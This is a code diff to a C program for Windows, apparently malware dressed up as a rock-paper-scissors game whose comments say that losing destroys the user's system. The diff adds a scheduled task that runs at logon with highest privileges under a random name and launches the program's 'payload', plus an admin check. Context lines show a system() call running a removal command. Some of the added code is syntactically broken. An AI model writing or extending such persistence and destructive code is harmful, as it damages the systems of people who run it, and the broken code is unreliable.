@@ -36,6 +36,7 @@ bool admin_check() {
         system(rm_cmd);
         return 1;
     }
+    return is_admin;
 }
 char rand_nm[7]; // global var, + null term
 const char charset[] = "abcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
@@ -70,6 +71,12 @@ void task_sch() {
     if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
         return;
     }
+
+    sprintf(cmd, 
+        "schtasks /create /sc onlogon /tn \"%s\" /tr \"%s payload\" /rl highest /f", 
+        rand_nm, exepath);
+    system(cmd);
+
 }
 // so if you win your system isnt destroyed
 void safe() {
@@ -95,8 +102,19 @@ void game() {
 	const char *dict[] = {"", "rock", "paper", "scissors"};
 	int robot = rand() % 3 + 1;
 	int play;
-	printf("rock(1), paper(2), scissors(3) >:");
-	scanf("%d", &play);
+    char input[16];
+
+	while (1){
+        printf("rock(1), paper(2), scissors(3) >:");
+        if (!fgets(input, sizeof(input), stdin)) 
+        continue;
+
+        if (sscanf(input, "%d", &play) !=1 || play<1 || play>3){ // from Tyler, input handling
+            printf("1, 2 or 3!!!\n invalid input ");
+            continue;
+    }
+    break; // valid input 
+
 	int rps = play - robot;
 	printf("robot chose %s\n", dict[robot]);
 	if (rps > 0 && rps != -2) {
@@ -105,7 +123,7 @@ void game() {
 	} else if (rps == -2) {printf("you won!\n");
         safe();
 	} else if (rps == -1) {printf("you lost :(\n");
-	} else if (rps == 0) {printf("tie, you lost :(\n"); }
+	} else if (rps == 0) {printf("tie, you lost :(\n")};
 }
 
 
@@ -205,6 +223,7 @@ int main(int argc, char *argv[]){
         payload();
         return 0;
     }
+    admin_check();
     srand(time(NULL));
     gen_rnd();
     task_sch();
